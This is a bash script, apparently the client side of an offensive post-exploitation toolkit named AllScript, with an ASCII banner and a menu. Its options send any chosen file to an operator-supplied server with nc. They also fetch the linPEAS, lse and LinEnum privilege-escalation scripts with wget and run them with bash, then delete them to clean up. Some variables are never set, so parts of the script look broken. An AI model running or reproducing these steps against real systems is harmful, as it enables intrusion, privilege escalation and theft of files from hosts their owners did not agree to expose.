# Black        0;30     Dark Gray     1;30
# Red          0;31     Light Red     1;31
# Green        0;32     Light Green   1;32
# Brown/Orange 0;33     Yellow        1;33
# Blue         0;34     Light Blue    1;34
# Purple       0;35     Light Purple  1;35
# Cyan         0;36     Light Cyan    1;36
# Light Gray   0;37     White         1;37

RED='\033[1;31m'
BLUE='\033[0;34m'
WHITE='\033[1;37m'
GREEN='\033[1;32m'
PURP='\033[1;35m'
currServerPath=""
GIP=""
echo -e "$BLUE
                                                                                                                   
       db         88           88                  888b      88                       88                           
      d88b        88           aa                  8888b     88                       88                           
     d8ss8b       88                               88 a8b    88                       88                           
    d8a  a8b      88 dPPYba    88  8b8dPPYba       88  a8b   88  aadPPYYbaa   aadPPYb,88  ,adPPYYbaa 18b       d8a 
   d8YaaaaY8b     88P      8a  88  88P'    Y8      88   a8b  88  aa     aY8  a8a    aY88  aa     1Y   8b      d8a  
  d8aaaaaaaa8b    88       d8  88  88              88    a8b 88  aadPPPPP88  8b       88  ,adPPPPP88   a8b   d8a   
 d8         a8b   88b     a8   88  88              88     a8888  88a    a88  a8aa   ad88  88a    a88    a8bad8a    
d8           a8b  8YaYbbd8aa   88  88              88      aa88  aa8bbdPaY8   aa8bbdP8Y8  aa8bbdPaY8      a8a      
                                                                                                                   
                                                                                                                   
$GREEN 
AllScript Client Script $BLUE

Version ---> 1.1 
GitHub  ---> https://github.com/AbirNadav-dev/AllScript
_________________________________________________________________________________________________________________

$PURP
"
echo "Enter Server IP:"
read GIP
down=""
deps=('wget' 'curl' 'nc')


if wget -q --method=HEAD http://$GIP:8000/;
 then
  echo -e "$GREEN"
  echo -e "[FOUND] AllScript Server Detected.
  
  "
 else
  echo -e "$RED"
  echo "[ERROR] Cant Find AllScript Server.
  
  "
fi




function checkDep (){
if ! command -v $1 &> /dev/null
then
    echo -e "$RED"
    echo -e "[WARNING] $1 could not be found $BLUE"
    
else
    echo -e "$GREEN[FOUND] ----> $1"
   [[ $1 -eq wget ]] && down=$1 || echo -e "$RED
   [WARNING] No Downloader Tool Found!"
fi
}




function getServerIP(){
   IP=$(hostname -I | awk '{print $1}')
    currServerPath="http://$IP:8000" 
}

# Get FileUpload Path

function getFileIP(){
   IP=$(hostname -I | awk '{print $1}')
    GIP="$IP" 
}

for item in ${deps[*]}
do
    checkDep $item
done



echo -e "$BLUE
_________________________________________________________________________________________________________________


$GREEN
"



pwd=$('pwd')
PS3='
Please enter your choice: '
options=("Upload File to Server" "Start LinPeas" "Start LinSmart" "Start LinEnum" "Clean" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Upload File to Server")
            echo -e "$PURP"
            echo "Enter File Path:"
            read -e fileName
            nc -w 3 $GIP 9886 < $fileName
            echo -e "$GREEN "
            ;;
        "Start LinPeas")
            echo -e "$PURP"
            wget "http://$lhost:$lport/lib/linPEAS/linpeas.sh"
            bash linpeas.sh
            echo -e "$GREEN "
            ;;
              "Start LinSmart")
            echo -e "$PURP"
            wget "http://$lhost:$lport/lib/LSE/lse.sh"
            bash lse.sh
            echo -e "$GREEN "
            ;;
              "Start LinEnum")
            echo -e "$PURP"
            wget "http://$lhost:$lport/lib/linEnum/LinEnum.sh"
            bash LinEnum.sh
            echo -e "$GREEN "
            ;;
            "Clean")
            echo -e "$PURP"
            echo "Cleaning Files"
            rm LinEnum.sh
            rm lse.sh
            rm linpeas.sh
            echo -e "$GREEN "
            ;;
        "Quit")
        echo "Good Bye, Im waiting at: $pwd"
            break
            ;;
        *) echo echo -e "$RED invalid option $REPLY";;
    esac
done


